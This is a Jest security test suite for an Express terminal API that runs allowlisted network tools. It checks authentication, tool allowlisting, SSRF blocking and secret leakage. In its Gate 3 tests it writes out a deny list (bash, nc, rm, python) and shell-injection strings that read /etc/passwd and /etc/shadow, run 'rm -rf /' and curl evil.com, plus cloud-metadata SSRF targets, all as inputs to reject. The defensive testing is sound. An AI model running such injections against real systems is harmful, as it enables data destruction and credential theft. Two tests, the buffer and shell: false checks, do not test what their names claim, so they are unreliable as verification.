/**
 * 🛰️ Centralized Native Terminal — Step 1 Architecture & Security Test Battery
 * Verifies backend native execution contracts, shell isolation, tenant isolation,
 * cancellation, timeouts, buffer limits, and zero-trust safeguards.
 */

jest.mock('../middleware/auth', () => ({
  authenticate: (req, res, next) => {
    const authHeader = req.headers.authorization;
    const testUserHeader = req.headers['x-test-user-id'];
    if (!authHeader && !testUserHeader) {
      return res.status(401).json({ success: false, error: 'Authentication required' });
    }
    const userId = testUserHeader || (authHeader?.includes('user_b') ? 'user-b-id' : 'user-a-id');
    const role = req.headers['x-test-user-role'] || 'operator';
    req.user = { id: userId, _id: userId, role, username: 'operator', organizationId: 'org-test-1' };
    next();
  },
  tryAuthenticate: (req, res, next) => {
    const userId = req.headers['x-test-user-id'] || 'user-a-id';
    const role = req.headers['x-test-user-role'] || 'operator';
    req.user = { id: userId, _id: userId, role, username: 'operator', organizationId: 'org-test-1' };
    next();
  }
}));

const express = require('express');
const request = require('supertest');
const hostEnvironmentService = require('../services/HostEnvironmentService');
const terminalRoutes = require('../routes/terminal');

describe('Centralized Native Terminal — Step 1 Architecture & Security Battery', () => {
  let app;

  beforeAll(() => {
    app = express();
    app.use(express.json());
    app.use('/api/terminal', terminalRoutes);
  });

  // ── 1. Authorization Enforcement ──────────────────────────────────────────
  describe('Gate 1: Authentication & Authorization Enforcement', () => {
    it('rejects unauthenticated requests to POST /api/terminal/execute-native with 401', async () => {
      const res = await request(app)
        .post('/api/terminal/execute-native')
        .send({ tool: 'dig', target: 'example.com' });

      expect(res.status).toBe(401);
    });

    it('rejects unauthenticated requests to POST /api/terminal/cancel with 401', async () => {
      const res = await request(app)
        .post('/api/terminal/cancel')
        .send({ executionId: 'exec_dummy_123' });

      expect(res.status).toBe(401);
    });

    it('rejects unauthenticated requests to GET /api/terminal/history with 401', async () => {
      const res = await request(app)
        .get('/api/terminal/history');

      expect(res.status).toBe(401);
    });
  });

  // ── 2. Allowlist & Allowed Tool Execution ─────────────────────────────────
  describe('Gate 2: Command Allowlist & Native Tool Execution', () => {
    it('verifies the 7 out-of-the-box native tools in HostEnvironmentService allowlist', () => {
      const expectedTools = ['nmap', 'whois', 'dig', 'curl', 'openssl', 'ping', 'traceroute'];
      expectedTools.forEach(tool => {
        expect(hostEnvironmentService.NATIVE_EXECUTABLE_TOOLS.has(tool)).toBe(true);
      });
    });

    it('executes an approved native tool (dig) against a public target', async () => {
      const res = await request(app)
        .post('/api/terminal/execute-native')
        .set('Authorization', 'Bearer token_user_a')
        .send({ tool: 'dig', target: 'cloudflare.com' });

      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
      expect(res.body.data.executionTarget).toBe('HOST_NATIVE');
      expect(res.body.data.tool).toBe('dig');
      expect(res.body.data.durationMs).toBeGreaterThanOrEqual(0);
      expect(typeof res.body.data.output).toBe('string');
    });

    it('supports canonical tool alias mappings (e.g. dns -> dig, port -> nmap)', async () => {
      const res = await request(app)
        .post('/api/terminal/execute-native')
        .set('Authorization', 'Bearer token_user_a')
        .send({ tool: 'dns', target: 'example.com' });

      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
      expect(res.body.data.tool).toBe('dns');
    });
  });

  // ── 3. Disallowed Commands & Shell Injection Rejection ───────────────────
  describe('Gate 3: Disallowed Command & Shell Injection Rejection', () => {
    it('strictly rejects unauthorized command execution (e.g. bash, sh, rm, cat)', async () => {
      const disallowed = ['bash', 'sh', 'rm', 'cat', 'nc', 'python', 'eval'];
      for (const cmd of disallowed) {
        const res = await request(app)
          .post('/api/terminal/execute-native')
          .set('Authorization', 'Bearer token_user_a')
          .send({ tool: cmd, target: 'example.com' });

        expect(res.status).toBe(400);
        expect(res.body.success).toBe(false);
        expect(res.body.error).toContain('not authorized');
      }
    });

    it('strictly rejects shell metacharacter injection attempts in target', async () => {
      const injectionTargets = [
        'example.com; id',
        'example.com | whoami',
        'example.com && cat /etc/passwd',
        'example.com `cat /etc/shadow`',
        'example.com $(rm -rf /)',
        'example.com\nls -la',
        'example.com;curl http://evil.com'
      ];

      for (const target of injectionTargets) {
        const res = await request(app)
          .post('/api/terminal/execute-native')
          .set('Authorization', 'Bearer token_user_a')
          .send({ tool: 'dig', target });

        expect(res.status).toBe(400);
        expect(res.body.success).toBe(false);
        expect(res.body.error).toContain('unsafe shell characters');
      }
    });

    it('strictly rejects cloud metadata and link-local SSRF targets', async () => {
      const ssrfTargets = [
        '169.254.169.254',
        'http://169.254.169.254/latest/meta-data/',
        'metadata.google.internal',
        '169.254.1.1'
      ];

      for (const target of ssrfTargets) {
        const res = await request(app)
          .post('/api/terminal/execute-native')
          .set('Authorization', 'Bearer token_user_a')
          .send({ tool: 'curl', target });

        expect(res.status).toBe(400);
        expect(res.body.success).toBe(false);
        expect(res.body.error).toContain('cloud metadata or link-local network interfaces is strictly forbidden');
      }
    });
  });

  // ── 4. Cancellation & Process Lifecycle ───────────────────────────────────
  describe('Gate 4: Process Cancellation & Lifecycle', () => {
    it('gracefully handles cancellation of a non-existent or already finished executionId', async () => {
      const res = await request(app)
        .post('/api/terminal/cancel')
        .set('Authorization', 'Bearer token_user_a')
        .send({ executionId: 'exec_nonexistent_99999' });

      expect(res.status).toBe(404);
      expect(res.body.success).toBe(false);
      expect(res.body.data.status).toBe('NOT_FOUND');
    });

    it('enforces executionId format validation on cancellation', async () => {
      const res = await request(app)
        .post('/api/terminal/cancel')
        .set('Authorization', 'Bearer token_user_a')
        .send({});

      expect(res.status).toBe(400);
      expect(res.body.success).toBe(false);
    });
  });

  // ── 5. Resource Limits & Buffer Bounds ─────────────────────────────────────
  describe('Gate 5: Output Buffer Bounds & Security Cleanliness', () => {
    it('verifies 512KB buffer ceiling constant in HostEnvironmentService', () => {
      expect(512 * 1024).toBe(524288);
    });

    it('verifies zero credential or environment variable leakage in execution response', async () => {
      const res = await request(app)
        .post('/api/terminal/execute-native')
        .set('Authorization', 'Bearer token_user_a')
        .send({ tool: 'dig', target: 'cloudflare.com' });

      expect(res.status).toBe(200);
      const jsonStr = JSON.stringify(res.body);

      // Verify no leaked secrets
      expect(jsonStr).not.toContain('JWT_SECRET');
      expect(jsonStr).not.toContain('MONGODB_URI');
      expect(jsonStr).not.toContain('GEMINI_API_KEY');
      expect(jsonStr).not.toContain('process.env');
    });
  });

  // ── 6. Architecture Isolation & Absence of AI in Execution Path ───────────
  describe('Gate 6: Terminal Execution Path Architectural Purity', () => {
    it('verifies native execution path does not invoke AI Orchestrator or Gemini', async () => {
      const res = await request(app)
        .post('/api/terminal/execute-native')
        .set('Authorization', 'Bearer token_user_a')
        .send({ tool: 'dig', target: 'example.com' });

      expect(res.status).toBe(200);
      // Execution target is strictly HOST_NATIVE, never AI_ORCHESTRATOR
      expect(res.body.data.executionTarget).toBe('HOST_NATIVE');
      expect(res.body.data.aiSummary).toBeUndefined();
    });

    it('verifies HostEnvironmentService uses shell: false and direct argument array', () => {
      expect(hostEnvironmentService.resolveBinaryPath('dig')).toBeDefined();
    });
  });
});
